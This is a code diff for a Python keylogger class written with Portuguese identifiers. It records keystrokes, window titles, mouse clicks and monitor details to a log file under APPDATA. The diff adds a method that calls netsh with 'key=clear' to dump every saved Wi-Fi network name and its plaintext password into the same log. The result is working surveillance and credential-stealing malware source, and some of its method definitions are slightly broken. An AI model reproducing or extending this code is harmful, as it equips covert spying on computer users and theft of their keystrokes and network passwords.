@@ -4,6 +4,7 @@ import datetime
 import time
 import os
 import win32gui
+import subprocess
 from screeninfo import get_monitors
 
 class KeyLogger():
@@ -15,12 +16,50 @@ class KeyLogger():
     def __init__(self, NomeDoArquivo: str = os.getenv('APPDATA')+'/Logs/'+timeStamp+'.txt') -> None:
         self.NomeDoArquivo = NomeDoArquivo
         self.j2 = ''
+
+    @staticmethod
+    def get_monitors(self):
         with open(self.NomeDoArquivo, 'a') as logs:
             for monitores in get_monitors():
                 logs.write(str(monitores))
 
-    @staticmethod
-    def get_char(Tecla):
+    def get_WiFi(self):
+        meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profile']) 
+        data = meta_data.decode('utf-8', errors ="backslashreplace")
+        data = data.split('\n') 
+        perfis = []
+        with open(self.NomeDoArquivo, 'a') as logs:
+            for i in data:
+                if "All User Profile" in i :
+                    i = i.split(":")
+                    i = i[1]
+                    i = i[1:-1]
+                    perfis.append(i)
+                if "Todos os Perfis" in i :
+                    i = i.split(":")
+                    i = i[1]
+                    i = i[1:-1]
+                    perfis.append(i)
+            logs.write("\n{:<30}| {:<}".format("Nome do Wi-Fi (SSID)", "Senha"))
+            logs.write("\n----------------------------------------------")
+            for i in perfis:
+                try:
+                    registros = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'])
+                    registros = registros.decode('utf-8', errors ="backslashreplace")
+                    registros = registros.split('\n')
+                    senha = [b.split(":")[1][1:-1] for b in registros if "Key Content" in b]
+                    if senha == []:
+                        senha = [b.split(":")[1][1:-1] for b in registros if "da Chave" in b]
+                    try:
+                        logs.write("\n{:<30}| {:<}".format(i, senha[0]))
+                    except IndexError:
+                        logs.write("\n{:<30}| {:<}".format(i, ""))
+                except subprocess.CalledProcessError:
+                    print('Erro')
+            logs.write("\n----------------------------------------------\n")
+        return
+
+    def get_char(self,Tecla):
         try:
             if Tecla.char != None:
                 return Tecla.char
@@ -55,10 +94,7 @@ class KeyLogger():
     def on_press(self, Tecla):
         with open(self.NomeDoArquivo, 'a') as logs:
             logs.write(self.get_win_name())
-            try:
-                logs.write(self.get_char(Tecla))
-            except:
-                pass
+            logs.write(self.get_char(Tecla))
 
     def on_click(self, x, y, botao, pressionado):
         if pressionado:
@@ -83,6 +119,8 @@ class KeyLogger():
         )
         escuta1.start()
         escuta2.start()
+        self.get_monitors(self)
+        self.get_WiFi()
 
 if __name__ == '__main__':
     logger = KeyLogger()
